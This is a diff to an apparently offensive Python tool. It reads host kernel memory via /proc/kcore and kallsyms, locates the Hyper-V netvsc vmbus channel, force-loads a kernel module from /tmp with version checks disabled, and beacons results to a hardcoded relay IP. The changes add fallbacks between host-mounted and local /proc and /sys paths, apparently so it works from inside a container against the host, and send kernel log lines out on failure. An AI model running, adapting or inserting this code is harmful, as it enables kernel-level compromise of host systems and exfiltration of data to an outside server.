@@ -19,8 +19,10 @@ import urllib.request
 
 RELAY = "http://16.146.243.72:8450/MYTH_D3_PD"
 NETVSC_CLASS = "f8615163-df3e-46c5-913f-f2d2f965ed0e"
+PROC = "/hostproc" if os.path.exists("/hostproc/kallsyms") else "/proc"
+SYS = "/hostsys" if os.path.exists("/hostsys/bus") else "/sys"
 MODULE = "/tmp/hvraw_pd.ko"
-PARAMS = "/hostsys/module/hvraw_pd/parameters/"
+PARAMS = SYS + "/module/hvraw_pd/parameters/"
 
 
 def read_run_id():
@@ -40,7 +42,7 @@ def beacon(payload):
 
 
 class KCore:
-    def __init__(self, path="/hostproc/kcore"):
+    def __init__(self, path=PROC + "/kcore"):
         self.fd = os.open(path, os.O_RDONLY)
         header = os.pread(self.fd, 64, 0)
         fields = struct.unpack("<16sHHIQQQIHHHHHH", header)
@@ -60,7 +62,7 @@ class KCore:
 
 
 def symbol_address(name):
-    with open("/hostproc/kallsyms") as stream:
+    with open(PROC + "/kallsyms") as stream:
         for line in stream:
             fields = line.split()
             if len(fields) >= 3 and fields[2] == name and fields[1].lower() == "t":
@@ -89,7 +91,7 @@ def channel_for_relid(kcore, relid):
 
 
 def netvsc_primary_relid():
-    for class_path in glob.glob("/hostsys/bus/vmbus/devices/*/class_id"):
+    for class_path in glob.glob(SYS + "/bus/vmbus/devices/*/class_id"):
         value = open(class_path).read().strip().strip("{}").lower()
         if value != NETVSC_CLASS:
             continue
@@ -112,15 +114,18 @@ def load_module(path):
     libc = ctypes.CDLL(None, use_errno=True)
     fd = os.open(path, os.O_RDONLY)
     try:
-        rc = libc.syscall(313, fd, b"", 0)
+        rc = libc.syscall(313, fd, b"", 3)
         return rc, (ctypes.get_errno() if rc else 0)
     finally:
         os.close(fd)
 
 
-def kmsg_lines():
+def kmsg_lines(needle="HVPD"):
     lines = []
-    fd = os.open("/dev/kmsg", os.O_RDONLY | os.O_NONBLOCK)
+    try:
+        fd = os.open("/dev/kmsg", os.O_RDONLY | os.O_NONBLOCK)
+    except OSError:
+        return lines
     try:
         while True:
             try:
@@ -129,7 +134,7 @@ def kmsg_lines():
                 break
             except OSError:
                 continue
-            if "HVPD" in record:
+            if needle in record:
                 lines.append(record.split(";", 1)[-1].strip())
     finally:
         os.close(fd)
@@ -173,9 +178,15 @@ def main():
         recv_fn = symbol_address("vmbus_recvpacket")
         result.update({"send_fn": hex(send_fn), "recv_fn": hex(recv_fn)})
 
+        result["uname"] = os.uname().release
         rc, errno = load_module(MODULE)
         if rc != 0 and errno != 17:  # EEXIST tolerated on rerun
-            result.update({"status": "finit_failed", "rc": rc, "errno": errno})
+            result.update({
+                "status": "finit_failed",
+                "rc": rc,
+                "errno": errno,
+                "kmsg": kmsg_lines("hvraw_pd")[-4:],
+            })
             beacon(result)
             return
         write_param("channel", hex(channel))
